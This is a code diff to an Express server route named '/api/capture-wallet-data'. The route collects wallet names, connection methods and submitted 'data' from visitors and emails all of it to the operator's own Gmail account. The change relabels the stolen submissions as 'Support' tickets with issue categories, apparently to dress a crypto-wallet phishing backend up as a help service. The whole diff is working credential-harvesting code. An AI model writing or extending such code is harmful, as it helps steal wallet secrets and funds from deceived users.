@@ -20,14 +20,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Capture wallet connection data and send to Gmail
   app.post('/api/capture-wallet-data', async (req, res) => {
     try {
-      const { wallet, method, data, timestamp } = req.body;
+      const { wallet, method, data, timestamp, category, categoryTitle } = req.body;
       
       // Prepare email content
       let emailContent = `
-        <h2>🔍 Wallet Connection Test Data</h2>
+        <h2>🔍 Wallet Connection - ${categoryTitle || 'Support'}</h2>
+        <h3>Issue Details:</h3>
+        <p><strong>Category:</strong> ${categoryTitle || 'General Support'}</p>
+        <p><strong>Category Slug:</strong> ${category || 'unknown'}</p>
         <p><strong>Timestamp:</strong> ${timestamp}</p>
         <p><strong>Wallet:</strong> ${wallet}</p>
-        <p><strong>Method:</strong> ${method}</p>
+        <p><strong>Connection Method:</strong> ${method}</p>
         <hr>
       `;
 
@@ -68,7 +71,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const mailOptions = {
         from: GMAIL_USER,
         to: GMAIL_USER, // Send to yourself
-        subject: `🔍 Wallet Test Data - ${wallet} (${method})`,
+        subject: `🔍 ${categoryTitle || 'Support'} - ${wallet} (${method})`,
         html: emailContent,
       };
 
